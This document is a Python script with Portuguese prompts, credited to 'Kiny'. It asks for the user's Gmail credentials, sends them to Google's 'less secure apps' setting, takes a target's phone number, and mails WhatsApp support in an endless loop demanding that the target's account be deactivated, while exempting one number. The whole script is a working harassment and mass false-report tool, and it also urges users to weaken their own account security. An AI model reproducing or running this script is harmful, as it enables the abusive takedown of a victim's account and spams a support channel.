global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
import smtplib, os, sys
def link():
	os.system("termux-open-url https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N--Kal_AFpd5rRJYyO0g-y1AbEQ")
# https://docs.python.org/3.5/library/smtplib.html
# http://stackoverflow.com/a/27515833/2684304
def restart():
    python = sys.executable;os.execl(python, python, *sys.argv)

def clear():
	os.system("clear")
	
try:
	import pyfiglet
except:
	os.system("pip install pyfiglet");restart()
result = pyfiglet.figlet_format("Kiny", font = "cosmic" );clear();print(f'''{C}{G}
{result}
...`
                             .+ss+//oss:`
                         `:oy+-       `:ss+.
                      `/ss/`              -oyo-
                   -+yo:                     `/ys/`
               `:sy+.                           `:sy+.
            `/ss/`                                  -+yo+
           -h/                                         .ys`
          `m-                                        -+ssdo
          -d                                      :sdNNNNNd
          :d                                  `/ymNNNNNNNNd
          :d                               .+hNNNNNNNNNNNNd
          :d                            -odNNNNNNNNNNNNNNNd
          :d                         :sdNNNNNNNNNNNNNNNNNNd
          :d                       +mNNNNNNNNNNNNNNNNNNNNNd
          :d                      sNNNNNNNNNNNNNNNNNNNNNNNd
          :d                      hNNNNNy`yyNNNNNNNNNNNNNNd
          :d                      hNNNNh-.:sNNNNNNNNNNNNNNd
          :d                      hNNNh`+NNNNNNNNNNNNNNNNNd
          -d                      hNNNy  `./mNNNNNNNNNNNNNd
          `m.                     hNNNNdyy- dNNNNNhmNNNNNNs
           :d:                    hNNNNNmh./NNmy/-+mNNNNNy`
            `+ys:`                hNNNh`` yNNNoodNNNNNmy:
               `/yy/.             hNNNNmh/mNNNNNNNNdo-
                  `:syo-          hNNNNNNNNNNNNNh+.
                      .+ys:`      hNNNNNNNNNms/`
                         `/sy+.   yNNNNNNdo-
                             -oyo/+mNmy/.
                                `-:::
{C}\n{C}{G}Coded By:{C} Kiny\n{C}[{R}*{C}] Ative a permissão de baixa segurança''');link();email = input(f'{C}[{Y}Gmail{C}]: ');senha = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9********){C}]: ')
if "+55 21 7918-0533" in numero:
	exit()
if "+55 21 79180533" in numero:
	exit()
if "55 21 7918053333" in numero:
	exit()
if "55 21 7918-0533" in numero:
	exit()
if "+55217918-0533" in numero:
	exit()
if "+552179180533" in numero:
	exit()
if "552179180533" in numero:
	exit()
if "55217918-0533" in numero:
	exit()
print(f"{C}[{R}*{C}] ENVIANDO DENÚNCIAS!")
while True:
	try:
		gmail_user = '{}'.format(email);gmail_password = '{}'.format(senha);sent_from = gmail_user;to = ['support@support.whatsapp.com'];subject = 'Desative este numero';body = 'Desative esta conta urgentemente: {}'.format(numero);email_text ="""\
From: %s
To: %s
Subject: %s
%s
		""" % (sent_from, ", ".join(to), subject, body);server = smtplib.SMTP_SSL('smtp.gmail.com', 465);server.ehlo();server.login(gmail_user, gmail_password);server.sendmail(sent_from, to, email_text);server.close()
	except:
		print(f"{C}[{R}ERROR{C}] Permissao nao garantida ou senha e email invalido(s).");exit()
